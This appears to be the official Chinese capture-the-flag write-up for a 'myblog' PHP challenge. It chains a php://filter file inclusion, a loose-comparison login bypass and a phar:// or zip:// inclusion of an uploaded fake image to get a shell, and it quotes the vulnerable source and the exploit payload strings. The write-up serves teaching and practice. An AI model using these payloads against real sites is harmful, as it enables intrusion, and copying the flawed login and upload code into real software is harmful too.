# myblog 官方wp

## 登录

打开是个blog,发现没什么交互点,只有一个login,但是不知道账号密码,尝试爆破是没啥用的...

注意到GET请求参数里有一个`page=login`,测试下这个点是否存在文件包含漏洞,使用`page=php://filter/read=convert.base64-encode/resource=login`成功读取到文件源码,注意到

```php
...
<form method="post" action="/?page=admin/user" class="form-validate" id="loginFrom">  // 表单提交到这个路径
...
<?php
require_once("secret.php");
mt_srand($secret_seed);
$_SESSION['password'] = mt_rand();
?>

```

再次读取admin/user.php的文件源码,查看登录逻辑

```php
<?php
error_reporting(0);
session_start();
$logined = false;
if (isset($_POST['username']) and isset($_POST['password'])){
	if ($_POST['username'] === "Longlone" and $_POST['password'] == $_SESSION['password']){  // No one knows my password, including myself
		$logined = true;
		$_SESSION['status'] = $logined;
	}
}
if ($logined === false && !isset($_SESSION['status']) || $_SESSION['status'] !== true){
    echo "<script>alert('username or password not correct!');window.location.href='index.php?page=login';</script>";
	die();
}
?>
```

可以看到password存在弱比较,假设在没有SESSION的情况下尝试抓包使用用户名Longlone,密码为空登录,此时由于$_SESSION['password']不存在而绕过了密码的判断,登录成功

## 文件上传

通过读取admin/user.php的源码,我们发现中间有一段上传的逻辑

```php
<?php
    if(isset($_FILES['Files']) and $_SESSION['status'] === true){
        $tmp_file = $_FILES['Files']['name'];
        $tmp_path = $_FILES['Files']['tmp_name'];
        if(($extension = pathinfo($tmp_file)['extension']) != ""){
            $allows = array('gif','jpeg','jpg','png');
            if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
                $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
                move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
                echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
            } else {
                echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
            }
        }
    }
?>
```

这里有一个小坑,很多人问我为什么上传提示成功但是实际上并没有上传,这是由于这里move_uploaded_file使用的是相对路径,如果他们直接访问/admin/user.php而不是?page=admin/user,由于相对路径的问题就会上传失败

这里注意到上传是白名单,不能上传php文件,但是联系到我们之前有个文件包含漏洞,我们可以想到文件包含漏洞的一个知识点:利用zip/phar协议

## GETFLAG

这里上传一个zip/phar文件都可以,具体如何生成phar请搜索相关文章,然后将文件后缀改成png等合法文件后缀即可

phar的payload: `?page=phar://var/www/heml/assets/img/upload/xxx.png/shell`

zip的payload:`?page=zip://var/www/heml/assets/img/upload/xxx.png%23shell`

成功getshell之后在根目录读取flag